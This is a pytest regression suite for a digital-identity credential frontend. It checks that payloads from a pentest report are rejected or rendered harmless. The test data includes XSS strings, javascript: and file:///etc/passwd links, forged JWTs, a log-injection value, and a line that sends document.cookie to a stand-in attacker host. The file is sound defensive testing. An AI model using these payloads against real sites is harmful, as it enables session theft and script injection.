###############################################################################
# Copyright (c) 2026 European Commission
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
###############################################################################
"""Regression tests for the 2026-07 pentest findings on the frontend.

Each test posts the attack payload from the report and checks that it is
rejected or rendered harmless.
"""

import json
import logging
import re

import pytest

QR = "data:image/png;base64,iVBORw0KGgo="
BACKEND = "https://backend.test"


def _post(client, path, payload):
    return client.post(path, data={"payload": json.dumps(payload)})


def _html(response):
    return response.get_data(as_text=True)


class TestJavascriptUrls:
    """XSS-VULN-01..04 / INJ-VULN-04..08: javascript: URLs in href, form action, onclick, script."""

    @pytest.mark.parametrize("field", ["wallet_dev", "url_data"])
    @pytest.mark.parametrize(
        "value", ["javascript:alert(document.domain)", "JAVASCRIPT:alert(1)", "data:text/html,<script>x</script>", "x\" onmouseover=\"y"]
    )
    def test_credential_offer_qr_code(self, client, field, value):
        payload = {"wallet_dev": "https://tester.test/offer", "url_data": "openid-credential-offer://x", "credential_offer": {}, "qrcode": QR}
        payload[field] = value
        response = _post(client, "/display_credential_offer_qr_code", payload)
        assert response.status_code == 400
        assert "javascript:" not in _html(response).lower()

    def test_credential_offer_qr_code_valid(self, client):
        offer = {"credential_issuer": "https://fe.test", "grants": {"x": "a&b"}}
        response = _post(
            client,
            "/display_credential_offer_qr_code",
            {"wallet_dev": "https://tester.test/offer", "url_data": "openid-credential-offer://?credential_offer=x", "credential_offer": offer, "qrcode": QR, "tx_code": 12345, "code": "c"},
        )
        assert response.status_code == 200
        html = _html(response)
        href = re.search(r'href="(https://tester\.test/offer\?[^"]*)"', html).group(1)
        # Query built with urlencode: the offer JSON cannot break out of its parameter.
        assert "code=c&amp;tx_code=12345&amp;credential_offer=%7B" in href

    @pytest.mark.parametrize("qrcode", ["javascript:alert(1)", "https://attacker.test/x.png", "data:image/svg+xml;base64,PHN2Zz4="])
    def test_qr_code_must_be_png_data_uri(self, client, qrcode):
        response = _post(
            client,
            "/display_credential_offer_qr_code",
            {"wallet_dev": "https://tester.test/offer", "url_data": "openid-credential-offer://x", "credential_offer": {}, "qrcode": qrcode},
        )
        assert response.status_code == 400

    @pytest.mark.parametrize(
        "field, value",
        [
            ("redirect_url", "javascript:alert(document.domain)"),
            ("redirect_url", "https://attacker.test/revoke"),
            ("revocation_choice_url", "javascript:alert(document.domain)"),
            ("revocation_choice_url", "http://x/';fetch('https://attacker.com/?c='+document.cookie)//"),
        ],
    )
    def test_revocation_authorization(self, client, field, value):
        payload = {
            "revocation_identifier": "id",
            "redirect_url": f"{BACKEND}/revocation/revoke",
            "revocation_choice_url": f"{BACKEND}/revocation/revocation_choice",
            "display_list": {},
        }
        payload[field] = value
        response = _post(client, "/display_revocation_authorization", payload)
        assert response.status_code == 400

    def test_revocation_authorization_has_no_inline_handler(self, client):
        response = _post(
            client,
            "/display_revocation_authorization",
            {
                "revocation_identifier": "id",
                "redirect_url": f"{BACKEND}/revocation/revoke",
                "revocation_choice_url": f"{BACKEND}/revocation/revocation_choice",
                "display_list": {},
            },
        )
        html = _html(response)
        assert response.status_code == 200
        assert "onclick=\"window.location" not in html
        assert f'href="{BACKEND}/revocation/revocation_choice?frontend_id=fe1"' in html

    def test_landing_page_revocation_link_names_this_frontend(self, client):
        html = client.get("/").get_data(as_text=True)
        assert f"{BACKEND}/revocation/revocation_choice?frontend_id=fe1" in html

    @pytest.mark.parametrize(
        "field, value",
        [
            ("redirect_url", "javascript:fetch(document.cookie)//"),
            ("url_data", "javascript:alert(document.domain)"),
            ("qrcode", "javascript:alert(1)"),
        ],
    )
    def test_revocation_qr_code(self, client, field, value):
        payload = {"presentation_id": "tx", "redirect_url": f"{BACKEND}/", "url_data": "eudi-openid4vp://x", "qrcode": QR}
        payload[field] = value
        assert _post(client, "/display_revocation_qr_code", payload).status_code == 400

    def test_revocation_qr_code_script_values_are_json_encoded(self, client):
        response = _post(
            client,
            "/display_revocation_qr_code",
            {"presentation_id": "a'</script><script>alert(1)</script>", "redirect_url": f"{BACKEND}/", "url_data": "eudi-openid4vp://x", "qrcode": QR},
        )
        html = _html(response)
        assert response.status_code == 200
        assert "<script>alert(1)" not in html
        assert 'var presentation_id = "a\\u0027\\u003c/script\\u003e' in html

    @pytest.mark.parametrize(
        "path, url_field",
        [
            ("/display_auth_method", "redirect_url"),
            ("/display_form", "redirect_url"),
            ("/display_authorization", "redirect_url"),
            ("/display_credential_offer", "redirect_url"),
            ("/display_revocation_choice", "redirect_url"),
        ],
    )
    @pytest.mark.parametrize("value", ["javascript:alert(1)//", "https://attacker.test/", None])
    def test_form_actions_must_be_on_the_backend(self, client, path, url_field, value):
        payload = {url_field: value, "mandatory_attributes": {}, "optional_attributes": {}, "presentation_data": {}, "cred": {}}
        assert _post(client, path, payload).status_code == 400

    @pytest.mark.parametrize(
        "path, endpoint",
        [
            ("/display_auth_method", "/"),
            ("/display_form", "/dynamic/form"),
            ("/display_form", "/preauth_form"),
            ("/display_authorization", "/dynamic/redirect_wallet"),
            ("/display_authorization", "/form_authorize_generate"),
            ("/display_credential_offer", "/"),
            ("/display_revocation_choice", "/revocation/oid4vp_call"),
        ],
    )
    def test_form_actions_on_the_backend_are_accepted(self, client, path, endpoint):
        payload = {"redirect_url": f"{BACKEND}{endpoint}", "mandatory_attributes": {}, "optional_attributes": {}, "presentation_data": {}, "cred": {}}
        assert _post(client, path, payload).status_code == 200

    def test_pid_login_deeplink_and_script(self, client):
        bad = _post(client, "/display_pid_login", {"deeplink_url": "javascript:alert(1)", "qr_img_base64": QR, "transaction_id": "t"})
        assert bad.status_code == 400
        good = _post(client, "/display_pid_login", {"deeplink_url": "eudi-openid4vp://v?x=1", "qr_img_base64": QR, "transaction_id": "t'\"<"})
        html = _html(good)
        assert good.status_code == 200 and 'var presentation_id = "t\\u0027\\"\\u003c";' in html


class TestDomXss:
    """New finding: attribute names reached innerHTML in dynamic-form.html."""

    def test_form_script_uses_no_inner_html_with_names(self, client):
        response = _post(
            client,
            "/display_form",
            {
                "redirect_url": f"{BACKEND}/dynamic/form",
                "mandatory_attributes": {},
                "optional_attributes": {'"><img src=x onerror=alert(1)>': {"type": "string"}},
            },
        )
        html = _html(response)
        assert response.status_code == 200
        assert "<img src=x onerror" not in html
        assert "innerHTML = `" not in html


class TestInternalError:
    def test_status_code_is_not_taken_from_the_payload(self, client):
        response = _post(client, "/internal_error", {"error": "<b>x</b>", "error_code": "E", "error_type": 302})
        assert response.status_code == 500
        assert "<b>x</b>" not in _html(response)


class TestHeadersAndCors:
    """No CSP, credentialed CORS reflecting any origin, SECRET_KEY='dev'."""

    def test_security_headers(self, client):
        headers = client.get("/").headers
        csp = headers["Content-Security-Policy"]
        assert "frame-ancestors 'none'" in csp
        # form-action would also block the backend's redirects to the
        # authorization server and identity providers after a form post.
        assert "form-action" not in csp
        assert "object-src 'none'" in csp and "base-uri 'none'" in csp
        assert headers["X-Content-Type-Options"] == "nosniff"
        assert headers["X-Frame-Options"] == "DENY"

    def test_no_credentialed_cors(self, client):
        response = client.post(
            "/display_revocation_success", headers={"Origin": "https://attacker.test"}
        )
        assert "Access-Control-Allow-Credentials" not in response.headers
        assert response.headers.get("Access-Control-Allow-Origin") is None

    def test_metadata_is_readable_cross_origin_without_credentials(self, client):
        response = client.get("/.well-known/openid-credential-issuer", headers={"Origin": "https://wallet.test"})
        assert response.headers["Access-Control-Allow-Origin"] == "*"
        assert "Access-Control-Allow-Credentials" not in response.headers

    def test_jwt_vc_issuer_metadata(self, client):
        response = client.get("/.well-known/jwt-vc-issuer", headers={"Origin": "https://wallet.test"})
        assert response.status_code == 200
        assert response.headers["Content-Type"] == "application/json"
        assert response.get_json()["issuer"] == "https://fe.test"
        assert response.headers["Access-Control-Allow-Origin"] == "*"

    def test_jwt_vc_issuer_metadata_absent_from_older_backend(self, client, monkeypatch):
        import app as app_module

        monkeypatch.setattr(app_module, "jwt_vc_issuer_metadata", {})
        monkeypatch.setattr("app.frontend.jwt_vc_issuer_metadata", {})
        assert client.get("/.well-known/jwt-vc-issuer").status_code == 404

    def test_no_session_cookie_or_secret(self, app, client):
        assert not app.config.get("SECRET_KEY")
        response = _post(client, "/display_pid_login", {"deeplink_url": "eudi-openid4vp://v", "qr_img_base64": QR, "transaction_id": "t"})
        assert "Set-Cookie" not in response.headers


class TestReferrerPolicy:
    """Pages post forms to the backend, whose CSRF check needs the Origin header.

    Browsers send ``Origin: null`` on a cross-site POST when the page's
    referrer policy is ``no-referrer`` or ``same-origin``.
    """

    BLOCKING = ("no-referrer", "same-origin")

    def test_templates_do_not_suppress_origin(self):
        import pathlib

        templates = pathlib.Path(__file__).resolve().parent.parent / "app" / "templates"
        for template in templates.rglob("*.html"):
            for policy in re.findall(r'<meta name="referrer" content="([^"]+)"', template.read_text()):
                assert policy not in self.BLOCKING, f"{template.name}: referrer {policy}"

    def test_header_does_not_suppress_origin(self, client):
        assert client.get("/").headers["Referrer-Policy"] not in self.BLOCKING


PAYLOAD_KEY = "shared-payload-key-for-tests-0123456789"


def _b64url(data: bytes) -> str:
    import base64

    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _payload_jwt(payload, key=PAYLOAD_KEY, header=None, digest="sha256", **claims):
    """Builds an HS256 ``payload_jwt`` as the backend does (claims overridable)."""
    import hashlib
    import hmac
    import time

    now = int(time.time())
    body = {"payload": payload, "aud": "fe1", "iat": now, "exp": now + 300, **claims}
    signing_input = f"{_b64url(json.dumps(header or {'alg': 'HS256', 'typ': 'JWT'}).encode())}.{_b64url(json.dumps(body).encode())}"
    signature = hmac.new(key.encode(), signing_input.encode(), getattr(hashlib, digest)).digest()
    return f"{signing_input}.{_b64url(signature)}"


class TestSignedPayload:
    """Display payloads must be signed by the backend when payload_key is set."""

    PAGE = "/display_revocation_qr_code"
    SIGNED = {"presentation_id": "signed-tx", "redirect_url": f"{BACKEND}/", "url_data": "eudi-openid4vp://x", "qrcode": QR}
    PLAIN = {**SIGNED, "presentation_id": "plain-tx"}

    @pytest.fixture(autouse=True)
    def _payload_key(self, monkeypatch):
        from app import CONFIGURATION

        monkeypatch.setitem(CONFIGURATION, "payload_key", PAYLOAD_KEY)

    def test_signed_payload_is_used_and_plain_payload_ignored(self, client):
        response = client.post(self.PAGE, data={"payload_jwt": _payload_jwt(self.SIGNED), "payload": json.dumps(self.PLAIN)})
        html = _html(response)
        assert response.status_code == 200
        assert "signed-tx" in html and "plain-tx" not in html

    def test_plain_payload_alone_is_rejected(self, client):
        response = _post(client, self.PAGE, self.PLAIN)
        assert response.status_code == 400
        assert "plain-tx" not in _html(response)

    @pytest.mark.parametrize(
        "token",
        [
            lambda p: _payload_jwt(p, key="wrong-key"),
            lambda p: _payload_jwt(p, header={"alg": "none"}),
            lambda p: _payload_jwt(p, header={"alg": "HS512"}, digest="sha512"),
            lambda p: _payload_jwt(p, header={"alg": "HS256", "crit": ["x"], "x": 1}),
            lambda p: _payload_jwt(p).rsplit(".", 1)[0] + ".",
            lambda p: _payload_jwt(p, aud="another-frontend"),
            lambda p: _payload_jwt(p, aud=None),
            lambda p: _payload_jwt(p, exp=int(__import__("time").time()) - 120),
            lambda p: _payload_jwt(p, iat=int(__import__("time").time()) - 400, exp=int(__import__("time").time()) + 10),
            lambda p: _payload_jwt(p, iat=int(__import__("time").time()) + 120, exp=int(__import__("time").time()) + 200),
            lambda p: _payload_jwt(p, exp=int(__import__("time").time()) + 3600),
            lambda p: _payload_jwt(p, exp=float("nan")),
            lambda p: _payload_jwt(p, iat=None),
            lambda p: _payload_jwt(json.dumps(p)),
            lambda p: "not.a.jwt!",
            lambda p: "a.b",
            lambda p: _payload_jwt(p) + "x",
        ],
        ids=[
            "wrong-key", "alg-none", "alg-hs512", "crit", "no-signature", "wrong-aud", "no-aud", "expired",
            "iat-too-old", "iat-in-future", "lifetime-too-long", "exp-nan", "no-iat", "payload-not-object",
            "garbage", "two-segments", "bad-signature-length",
        ],
    )
    def test_invalid_token_is_rejected_with_a_generic_page(self, client, token):
        response = client.post(self.PAGE, data={"payload_jwt": token(self.SIGNED), "payload": json.dumps(self.PLAIN)})
        html = _html(response)
        assert response.status_code == 400
        assert "could not be verified" in html
        assert "signed-tx" not in html and "plain-tx" not in html

    def test_tampered_claims_are_rejected(self, client):
        header, _, signature = _payload_jwt(self.SIGNED).split(".")
        forged = _b64url(json.dumps({"payload": self.PLAIN, "aud": "fe1", "iat": 0, "exp": 1}).encode())
        response = client.post(self.PAGE, data={"payload_jwt": f"{header}.{forged}.{signature}"})
        assert response.status_code == 400

    def test_internal_error_page_requires_the_token(self, client):
        response = _post(client, "/internal_error", {"error": "attacker text", "error_code": "E"})
        assert response.status_code == 400 and "attacker text" not in _html(response)


class TestStartup:
    @staticmethod
    def _create_app():
        from unittest import mock

        import app as app_module
        from tests.conftest import _fake_get

        with mock.patch("requests.get", _fake_get), mock.patch.object(app_module, "configure_logging"):
            return app_module.create_app({"TESTING": True})

    @pytest.mark.parametrize("url", ["http://backend.test", "http://10.0.0.5:5000", "ftp://backend.test"])
    def test_backend_url_must_be_https(self, monkeypatch, url):
        from app import CONFIGURATION

        monkeypatch.setitem(CONFIGURATION, "backend_url", url)
        with pytest.raises(RuntimeError, match="https"):
            self._create_app()

    @pytest.mark.parametrize("url", ["http://localhost:5000", "http://127.0.0.1:5000", "http://[::1]:5000", "https://backend.test"])
    def test_local_http_backend_url_is_allowed(self, monkeypatch, url):
        import app as app_module

        monkeypatch.setitem(app_module.CONFIGURATION, "backend_url", url)
        app_module._check_backend_url()

    def test_unauthenticated_payloads_are_warned_about(self, monkeypatch):
        from unittest import mock

        import app as app_module

        monkeypatch.setattr(app_module, "logger", mock.Mock())
        self._create_app()
        warnings = " ".join(str(call) for call in app_module.logger.warning.call_args_list)
        assert "payload_key" in warnings and "unauthenticated" in warnings

    def test_metadata_requests_do_not_follow_redirects(self, monkeypatch):
        from unittest import mock

        import requests

        import app as app_module

        get = mock.Mock(return_value=mock.Mock(is_redirect=False, json=lambda: {"ok": 1}))
        monkeypatch.setattr(requests, "get", get)
        assert app_module._fetch_backend_metadata("") == {"ok": 1}
        assert get.call_args.kwargs["allow_redirects"] is False

        get.return_value = mock.Mock(is_redirect=True, status_code=302)
        with pytest.raises(RuntimeError):
            app_module._fetch_backend_metadata("")


class TestWalletLinks:
    PAGE = "/display_revocation_qr_code"

    def _post_link(self, client, link):
        return _post(client, self.PAGE, {"presentation_id": "tx", "redirect_url": f"{BACKEND}/", "url_data": link, "qrcode": QR})

    @pytest.mark.parametrize(
        "link",
        [
            "openid-credential-offer://?credential_offer_uri=x",
            "haip-vci://?credential_offer_uri=x",
            "eudi-openid4ci://?credential_offer_uri=x",
            "openid4vp://?request_uri=x",
            "eudi-openid4vp://verifier?request_uri=x",
            "haip://?request_uri=x",
            "mdoc-openid4vp://?request_uri=x",
            "my-test-wallet://credential_offer?credential_offer=x",
            "https://tester.test/credential_offer",
            "https://wallet.example/credential_offer",
            "https://backend.test/x",
        ],
    )
    def test_wallet_links_are_accepted(self, client, link):
        assert self._post_link(client, link).status_code == 200

    @pytest.mark.parametrize(
        "link",
        [
            "javascript://x%0aalert(1)",
            "data://text/html,x",
            "vbscript://x",
            "file:///etc/passwd",
            "blob://x",
            "about://blank",
            "openid-credential-offer://x\"><script>",
            "openid-credential-offer://x y",
            "no-scheme",
        ],
    )
    def test_code_running_schemes_and_unsafe_characters_are_rejected(self, client, link):
        assert self._post_link(client, link).status_code == 400


class TestBackendPathPinning:
    @pytest.mark.parametrize(
        "path, url",
        [
            ("/display_form", f"{BACKEND}/revocation/revoke"),
            ("/display_form", f"{BACKEND}/dynamic/form?next=x"),
            ("/display_form", f"{BACKEND}/dynamic/form#x"),
            ("/display_form", f"{BACKEND}/"),
            ("/display_authorization", f"{BACKEND}/dynamic/form"),
            ("/display_auth_method", f"{BACKEND}/revocation/revoke"),
            ("/display_credential_offer", f"{BACKEND}/dynamic/form"),
            ("/display_revocation_choice", f"{BACKEND}/"),
        ],
    )
    def test_other_backend_endpoints_are_rejected(self, client, path, url):
        payload = {"redirect_url": url, "mandatory_attributes": {}, "optional_attributes": {}, "presentation_data": {}, "cred": {}}
        assert _post(client, path, payload).status_code == 400

    @pytest.mark.parametrize(
        "field, value",
        [("redirect_url", f"{BACKEND}/revocation/revocation_choice"), ("revocation_choice_url", f"{BACKEND}/revocation/revoke")],
    )
    def test_revocation_urls_cannot_be_swapped(self, client, field, value):
        payload = {
            "revocation_identifier": "id",
            "redirect_url": f"{BACKEND}/revocation/revoke",
            "revocation_choice_url": f"{BACKEND}/revocation/revocation_choice",
            "display_list": {},
        }
        payload[field] = value
        assert _post(client, "/display_revocation_authorization", payload).status_code == 400

    def test_revocation_qr_code_endpoint_is_pinned(self, client):
        payload = {"presentation_id": "tx", "redirect_url": f"{BACKEND}/revocation/", "url_data": "eudi-openid4vp://x", "qrcode": QR}
        assert _post(client, "/display_revocation_qr_code", payload).status_code == 400


class TestRequestLimits:
    def test_request_size_is_limited(self, app, client):
        assert app.config["MAX_CONTENT_LENGTH"] == 1024 * 1024
        response = client.post("/display_pid_login", data={"x": "a" * (1024 * 1024)})
        assert response.status_code == 413


class TestContentSecurityPolicy:
    TEMPLATES = __import__("pathlib").Path(__file__).resolve().parent.parent / "app" / "templates"

    def test_no_unsafe_inline_scripts_or_any_https_styles(self, client):
        csp = client.get("/").headers["Content-Security-Policy"]
        directives = dict(d.strip().split(" ", 1) for d in csp.split(";"))
        assert "'unsafe-inline'" not in directives["script-src"]
        assert "'nonce-" in directives["script-src"]
        assert "https:" not in directives["style-src"].split()
        assert directives["frame-ancestors"] == "'none'" and directives["base-uri"] == "'none'" and directives["object-src"] == "'none'"

    def test_inline_scripts_carry_the_response_nonce(self, client):
        responses = [
            _post(client, "/display_revocation_qr_code", {"presentation_id": "tx", "redirect_url": f"{BACKEND}/", "url_data": "eudi-openid4vp://x", "qrcode": QR})
            for _ in range(2)
        ]
        nonces = []
        for response in responses:
            nonce = re.search(r"'nonce-([^']+)'", response.headers["Content-Security-Policy"]).group(1)
            inline = re.findall(r"<script(?![^>]*\bsrc=)([^>]*)>", _html(response))
            assert inline and all(f'nonce="{nonce}"' in attributes for attributes in inline)
            nonces.append(nonce)
        assert nonces[0] != nonces[1]

    def test_templates_have_no_inline_handlers_or_unnonced_scripts(self):
        for template in self.TEMPLATES.rglob("*.html"):
            text = template.read_text()
            assert not re.search(r"\son[a-z]+\s*=", text), template.name
            for attributes in re.findall(r"<script(?![^>]*\bsrc=)([^>]*)>", text):
                assert "nonce=" in attributes, template.name


class TestCleanup:
    def test_unused_templates_are_removed(self):
        templates = TestContentSecurityPolicy.TEMPLATES
        assert not (templates / "misc" / "eidas_fail.html").exists()
        assert not (templates / "dynamic" / "pt_url.html").exists()

    def test_pid_login_polls_and_opens_the_backend(self, client):
        html = _html(_post(client, "/display_pid_login", {"deeplink_url": "eudi-openid4vp://v", "qr_img_base64": QR, "transaction_id": "t"}))
        assert 'url: "https://backend.test/pid_authorization"' in html
        assert 'window.location.replace("https://backend.test/getpidoid4vp" + ' in html

    def test_qr_code_back_links_open_the_backend(self, client):
        # A relative link would resolve on this frontend, which has no such page.
        html = _html(_post(client, "/display_pid_login", {"deeplink_url": "eudi-openid4vp://v", "qr_img_base64": QR, "transaction_id": "t"}))
        assert 'href="https://backend.test/auth_method_choice"' in html
        payload = {"url_data": "eudi-openid4vp://v", "qrcode": QR, "presentation_id": "t", "redirect_url": f"{BACKEND}/"}
        html = _html(_post(client, "/display_revocation_qr_code", payload))
        assert 'href="https://backend.test/revocation/revocation_choice"' in html

    @pytest.mark.parametrize("service", ["oauth-authorization-server", "openid-configuration", "unknown"])
    def test_authorization_server_metadata_is_not_served_here(self, client, service):
        # Wallets read it from the authorization server in authorization_servers.
        assert client.get(f"/.well-known/{service}").status_code == 404

    def test_no_pushed_authorization_relay(self, client):
        # Wallets push authorization requests to the authorization server.
        assert client.post("/pushed_authorization", data={"client_id": "w"}).status_code in (404, 405)

    def test_signed_metadata_unavailable_is_not_a_server_error(self, client, monkeypatch):
        import app as app_module

        monkeypatch.setattr(app_module, "signed_metadata", None)
        response = client.get("/.well-known/openid-credential-issuer", headers={"Accept": "application/jwt"})
        assert response.status_code == 406

    def test_not_found_logs_one_line(self, client, monkeypatch):
        from unittest import mock

        import app as app_module

        monkeypatch.setattr(app_module, "logger", mock.Mock())
        assert client.get("/no-such-page").status_code == 404
        app_module.logger.exception.assert_not_called()
        app_module.logger.warning.assert_called_once()

    def test_no_werkzeug_debug_star_import(self):
        import app as app_module

        assert not hasattr(app_module, "DebuggedApplication")


class TestSessionTrail:
    def test_page_is_logged_with_the_session_id(self, client, caplog):
        with caplog.at_level(logging.INFO, logger="app.frontend"):
            _post(client, "/display_countries", {"countries": {}, "session_id": "0b9e6c1e-2f4a-4d1b-9c3e-7a1f2b3c4d5e"})
        assert ", Session ID: 0b9e6c1e-2f4a-4d1b-9c3e-7a1f2b3c4d5e, Page: /display_countries" in caplog.text

    def test_unsafe_session_id_is_not_echoed(self, client, caplog):
        with caplog.at_level(logging.INFO, logger="app.frontend"):
            _post(client, "/display_countries", {"countries": {}, "session_id": "x\r\nFORGED log line"})
        assert "FORGED" not in caplog.text
        assert ", Session ID: <invalid>, Page: /display_countries" in caplog.text

    def test_pages_without_a_session_are_not_logged(self, client, caplog):
        with caplog.at_level(logging.INFO, logger="app.frontend"):
            _post(client, "/internal_error", {"error": "e", "error_code": "E"})
        assert "Session ID" not in caplog.text


class TestConsentImages:
    """Image attributes are shown as images, at any nesting level."""

    PAGE = "/display_authorization"
    NAMES = (
        "portrait",
        "picture",
        "image",
        "signature_usual_mark",
        "signature_usual_mark_issuing_officer",
        "issuing_authority_logo",
    )

    def _page(self, client, **extra):
        payload = {
            "redirect_url": f"{BACKEND}/dynamic/redirect_wallet",
            "presentation_data": {"mDL": {name: f"{name}B64" for name in self.NAMES} | {"family_name": "Doe"}},
            **extra,
        }
        response = _post(client, self.PAGE, payload)
        assert response.status_code == 200
        return _html(response)

    def test_default_image_attributes(self, client):
        html = self._page(client)
        for name in self.NAMES:
            assert f'src="data:image/jpeg;base64,{name}B64"' in html
        assert "Signature Usual Mark Issuing Officer" in html
        assert 'data:image/jpeg;base64,Doe"' not in html

    def test_backend_image_attributes(self, client):
        html = self._page(client, image_attributes=["family_name"])
        assert 'src="data:image/jpeg;base64,Doe"' in html
        assert 'data:image/jpeg;base64,portraitB64"' not in html

    def test_invalid_image_attributes_use_the_default(self, client):
        html = self._page(client, image_attributes="portrait")
        assert 'src="data:image/jpeg;base64,signature_usual_markB64"' in html
